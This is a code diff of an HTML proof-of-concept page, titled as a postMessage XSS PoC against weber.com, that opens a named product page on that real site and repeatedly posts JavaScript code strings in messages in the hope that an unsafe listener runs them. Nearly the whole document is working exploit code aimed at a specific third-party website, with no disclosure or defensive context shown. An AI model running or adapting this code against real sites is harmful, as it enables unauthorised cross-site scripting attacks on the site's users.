@@ -4,44 +4,35 @@
 <body>
 
   postMessage XSS PoC — weber.com
-<button onclick="start()">Open target & send payload</button>
 
 <script>
-const TARGET = "https://www.weber.com/US/en/smoquepelletgrill.html";
-const RUNTIME_MS = 20000;   // how long to keep sending
-const TICK_MS    = 400;     // how often to send
+const TARGET = "https://www.weber.com/US/en/smoquepelletgrill.html"; // change if needed
+const RUNTIME_MS = 20000;   // total send time
+const INTERVAL_MS = 350;    // send cadence
 
-// Try both shapes; add fields if the handler checks them (e.g., type:'exec')
+// Add/modify fields if the listener expects e.g. {type:"exec"} or similar
 const payloads = [
   { isTrusted: true, code: "alert('pwned: '+document.domain)" },
   JSON.stringify({ isTrusted: true, code: "alert('pwned JSON: '+document.domain)" })
 ];
 
-function sendTo(win) {
-  for (const p of payloads) {
-    try { win.postMessage(p, "*"); } catch (_) {}
-  }
+function sendTo(win){
+  for (const p of payloads) { try { win.postMessage(p, "*"); } catch(_){} }
 }
 
-// BFS over windows/frames without reading cross-origin properties
-function blast(win) {
-  const q = [win];
-  const seen = new Set();
-  while (q.length) {
-    const w = q.shift();
-    if (seen.has(w)) continue;
-    seen.add(w);
+document.getElementById('go').onclick = () => {
+  // user gesture -> opener is set, avoids popup blocker
+  const w = window.open(TARGET, "weber_poc", "noopener=false"); // keep opener
+  if (!w) { alert("Popup blocked – allow popups for this page and click again."); return; }
+
+  // retry for late-loaded code / SPA transitions
+  const t0 = Date.now();
+  const timer = setInterval(() => {
+    if (Date.now() - t0 > RUNTIME_MS) { clearInterval(timer); return; }
     sendTo(w);
-    // enumerate child frames by count; WindowProxy is accessible cross-origin
-    let n = 0;
-    try { n = w.frames.length; } catch (_) { n = 0; }
-    for (let i = 0; i < n; i++) {
-      try { q.push(w.frames[i]); } catch (_) {}
-    }
-  }
-}
-
-async function start() {
-  const w = window.open(TARGET, "weber_poc"); // user gesture avoids popup block
-  if (!w) { alert("Popup blocked—allow popups for this PoC."); r
-
+    // also try posting back to ourselves (some handlers echo to opener)
+    try { w.postMessage({ isTrusted:true, code:"window.opener && window.opener.postMessage('OPENER_OK','*')" }, "*"); } catch(_){}
+  }, INTERVAL_MS);
+};
+</script>
+</body>
